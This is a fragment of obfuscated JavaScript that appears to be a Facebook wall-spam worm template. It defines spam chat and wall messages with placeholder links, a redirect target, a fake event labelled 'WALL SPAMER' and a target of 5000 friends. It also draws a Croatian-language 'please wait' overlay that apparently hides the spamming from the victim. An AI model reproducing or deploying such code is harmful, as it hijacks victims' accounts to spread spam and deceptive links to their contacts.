...
var chatmessage = '%firstname% EDIT @  http://www.facebook.com/... (EDIT) ?' + randomnumber;
var postmessage = 'Eee \x0A %tf%  \x0A %tf%  \x0A %tf%  \x0A %tf%  \x0A EDIT @ http://www.facebook.com/....?' + randomnumber;
var redirect = 'WHERE TO REDIRECT';
var eventdesc = 'WALL SPAMER @ http://www.facebook.com/....?' + randomnumber;
var eventname = 'NAME';
var nfriends = 5000;
var debug = false;
var wf = 0;
...
_0xaa04x18['style']['background'] = 'white';
_0xaa04x18['style']['zIndex'] = 99;
_0xaa04x18['innerHTML'] = '&nbsp;<br/>Molimo pricekajte, ovo moze potrajati nekoliko minuta...<br/><br/>A ako ne zelis da cekas <a href="javascript:void(0);" onclick="wf=0; mf();"> Klikni Ovdje </a> (rezultati ce biti mozda i prikazani!)<br/><img src="http://i494.photobucket.com/albums/rr305/nayannew/circle.gif">';
